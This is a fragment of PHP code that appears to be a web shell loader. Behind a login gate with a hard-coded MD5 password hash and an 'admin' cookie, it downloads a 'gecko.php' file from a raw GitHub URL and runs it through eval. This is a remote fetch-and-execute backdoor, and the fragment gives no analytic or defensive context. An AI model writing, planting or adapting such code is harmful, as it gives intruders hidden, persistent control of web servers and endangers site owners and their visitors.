...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/K317Z0/K317Z0/main/gecko.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '0e4226d5195cfadf269c70ab1a7b325f'; // Replace this with your MD5 hashed password
        if (md5($entered_password) === $hashed_password) {
            // Password is correct, set a cookie to indicate login
            setcookie('user_id', 'admin', time() + 3600, '/'); // Ganti 'admin' dengan nilai yang sesuai
        } else {
